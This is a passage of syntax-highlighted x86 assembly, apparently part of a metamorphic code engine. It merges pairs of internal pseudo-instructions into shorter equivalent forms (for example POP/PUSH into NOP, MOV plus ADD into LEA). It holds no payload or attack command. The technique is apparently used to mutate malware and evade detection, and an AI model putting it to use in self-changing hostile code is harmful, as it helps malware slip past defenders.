                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc0">      </span><span class="sc1">; MOV Mem,Reg + CALL Mem = CALL Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next02_XXXMem</span><span class="sc0">
        </span><span class="sc5">@@Double_Next_OPRegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">       </span><span class="sc1">; Check operation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Bh</span><span class="sc0">       </span><span class="sc1">; Check for CMP Mem,Reg</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next02_MergeCheck</span><span class="sc0"> </span><span class="sc1">; If it is, merge the check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">       </span><span class="sc1">; Check for TEST Mem,Reg</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next02_MergeCheck</span><span class="sc0"> </span><span class="sc1">; If it is, merge</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">       </span><span class="sc1">; Check for TEST Reg,Mem (in fact, the</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next02_MergeCheck</span><span class="sc0"> </span><span class="sc1">; same x86 opcode)</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; Check for OP Reg,Mem</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">     </span><span class="sc1">; If not, finish</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; If so, merge it:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; MOV Mem,Reg + OP Reg,Mem = OP Reg,Reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; We don't care about the two registers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; being equal, because that is going to</span><span class="sc0">
                                       </span><span class="sc1">; be checked by the scanning of single</span><span class="sc0">
                                       </span><span class="sc1">; instructions</span><span class="sc0">
        </span><span class="sc5">@@Double_Next02_SetOP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get the OP</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">      </span><span class="sc1">; Transform it to OP Reg,Reg</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Double_Next02_MergeCheck</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Merge the check (if CMP/TEST Reg,Mem)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next02_SetOP</span><span class="sc0">
        </span><span class="sc5">@@Double_Next02_PushReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">       </span><span class="sc1">; MOV Mem,Reg/PUSH Mem = PUSH Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">

      </span><span class="sc5">@@Double_Next03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [esi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">   </span><span class="sc1">; Check pair beginning with MOV Mem8,Reg8</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next04</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">  </span><span class="sc1">; Check if it's a normal operation</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Double_End</span><span class="sc0">    </span><span class="sc1">; (pseudo-opcodes 80-CC)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Double_Next_OPRegReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">

      </span><span class="sc5">@@Double_Next04</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">    </span><span class="sc1">; Check if it begins with MOV Mem,Imm</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next05</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">    </span><span class="sc1">; PUSH Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next04_PushImm</span><span class="sc0"> </span><span class="sc1">; Set PUSH Imm</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Double_Next05</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; OP Reg,Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next05</span><span class="sc0">  </span><span class="sc1">; If not, check next pair</span><span class="sc0">
        </span><span class="sc5">@@Double_Next_Merge_MOV_OP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">   </span><span class="sc1">; MOV Mem,Imm + OP Reg,Mem = OP Reg,Imm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Double_Next04_PushImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">    </span><span class="sc1">; MOV Mem,Imm + PUSH Mem = PUSH Imm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">

      </span><span class="sc5">@@Double_Next05</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">  </span><span class="sc1">; Same as above, but 8 bits operations</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next06</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Double_Next06</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Double_Next06</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next06</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_Merge_MOV_OP</span><span class="sc0">

      </span><span class="sc5">@@Double_Next06</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">59h</span><span class="sc0">     </span><span class="sc1">; POP Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next_NoMem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">     </span><span class="sc1">; POP Mem + MOV Reg,Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next06_POPReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">     </span><span class="sc1">; POP Mem + MOV Mem,Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next06_POPMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">     </span><span class="sc1">; POP Mem + PUSH Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next_SetDoubleNOP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">    </span><span class="sc1">; POP Mem + JMP Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next_NoMem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">    </span><span class="sc1">; POP Mem + JMP Mem = RET</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Double_Next06_POPReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">     </span><span class="sc1">; POP Mem + MOV Reg,Mem = POP Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Double_Next06_POPMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; POP Mem + MOV Mem2,Mem = POP Mem2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetNOP</span><span class="sc0">
        </span><span class="sc5">@@Double_Next_SetDoubleNOP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">; POP Mem + PUSH Mem = NOP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">


      </span><span class="sc5">@@Double_Next_NoMem</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">       </span><span class="sc1">; MOV Reg,Imm?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next07</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; MOV Reg,Imm + MOV Reg8,Mem8?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next06_MaybeMOVZX</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; MOV Reg,Imm + ADD Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next07</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; MOV Reg,Imm + ADD Reg,Reg2 =</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; = LEA Reg,[Reg2+Imm]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next07</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">@@Double_Next06_SetLEA</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
      </span><span class="sc5">@@Double_Next06_MaybeMOVZX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next07</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next07</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next07</span><span class="sc0">
